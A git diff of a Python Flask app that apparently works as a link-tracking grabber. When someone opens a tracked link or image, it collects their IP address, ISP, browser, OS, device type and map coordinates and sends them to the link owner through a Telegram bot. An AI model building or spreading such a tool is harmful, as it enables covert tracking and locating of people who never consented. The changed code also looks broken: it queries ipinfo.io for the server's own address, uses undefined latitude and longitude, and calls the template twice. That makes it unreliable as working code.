@@ -12,6 +12,7 @@ from telegram import ParseMode
 import requests
 import json
 from dotenv import load_dotenv
+from user_agents import parse
 
 load_dotenv()
 
@@ -68,20 +69,48 @@ def get_hostname_and_tld(url):
     tld = '.'.join(hostname.split('.')[-2:])  # Extract the last two components as TLD
     return tld
 
-def textTemplate(log_user, json_data):
-    print(json_data)
-    ipAddress = json_data['dataip']['ip'];
-    isp = json_data['dataip']['data_asn']['name'];
-    browser = json_data['dataua']['client']['name'];
-    engine = json_data['dataua']['client']['engine'];
-    strOs = json_data['dataua']['os']['name'] + ' ' +json_data['dataua']['os']['version'];
-    device = json_data['dataua']['device']['type'];
+def get_from_ipinfo():
+    url = 'https://ipinfo.io/'
+    response = requests.get(url)
     
+    if response.status_code == 200:
+        data = response.json()
+        
+        if data:
+            return data
+        else:
+            return "Organization not found."
+    else:
+        return f"Failed to retrieve data. Status code: {response.status_code}"
+
+
+def textTemplate(log_user):
+    visitor = get_from_ipinfo()
+    ua_str = str(request.user_agent)
+    ua = parse(ua_str)
+
+    os_name = ua.os.family
+    os_version = ua.os.version_string
+    browser_name = ua.browser.family
+    browser_version = ua.browser.version_string
+    if ua.is_mobile:
+        device = 'mobile'
+    else:
+        device = 'desktop'
+        
+    
+    ipAddress = visitor.get('ip')
+    isp = visitor.get('org')
+    browser = browser_name  + ' ' + browser_version
+    strOs = os_name + ' ' + os_version
+    device = device
+
     return """
+*Lat:{lat}*
+*Long:{long}*
 *IP Address:*{ipaddr}
 *ISP:*{isp}
 *Browser:*{browser}
-*Engine:*{engine}
 *OS:*{str_os}
 *Device:*{device}
 *Lokasi Map:* https://www.google.co.id/maps/place/{lat},{long}
@@ -93,7 +122,6 @@ def textTemplate(log_user, json_data):
         ipaddr=ipAddress,
         isp=isp,
         browser=browser,
-        engine=engine,
         str_os=strOs,
         device=device
     )
@@ -205,12 +233,10 @@ def image():
     cur.execute("SELECT * FROM `visitors` WHERE `url_id` = %s order by id desc;", [data_url[0]])
     visitor = cur.fetchone()
     
-    json_data = []
-    if (visitor is not None):
-        json_data = json.loads(visitor[2])
     cur.close()
     
-    telegram_bot_sendtext(data_url[2], textTemplate(log_user, json_data))
+    telegram_bot_sendtext(data_url[2], textTemplate(log_user))
+    textTemplate(log_user)
     
     return {
         "message": "OK",
@@ -222,7 +248,10 @@ def visitor():
     
     user_id = request.form["user_id"]
     url = request.form["url"]
-    json = request.form["json"]
+    # json = request.form["json"]
+    ua = str(request.user_agent)
+    # device = DeviceDetector(ua).parse()
+    # json = device
     
     cur = conn.cursor()
     cur.execute("SELECT * FROM `urls` WHERE `url` = %s and `user_id` = %s;", [url, user_id])
